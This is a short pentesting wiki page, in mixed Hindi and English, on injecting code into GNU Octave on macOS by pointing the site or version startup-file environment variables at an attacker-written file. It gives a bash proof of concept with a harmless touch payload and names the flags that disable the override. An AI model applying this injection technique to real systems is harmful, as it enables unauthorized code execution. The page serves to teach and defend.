# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave स्टार्टअप के दौरान valid Octave commands वाली कई फ़ाइलों को execute करता है। `OCTAVE_SITE_INITFILE` site-wide startup file को override करता है और `OCTAVE_VERSION_INITFILE` version-specific startup file को override करता है, जिससे कोई भी variable automatic execution को attacker-readable file पर redirect कर सकता है।<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` केवल `~/.octaverc` जैसी user files को skip करता है; यह ऊपर दिए गए site-file override को **नहीं** रोकता। site files के लिए `--no-site-file` का उपयोग करें या सभी startup files को disable करने के लिए `--norc` / `-f` का उपयोग करें।<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
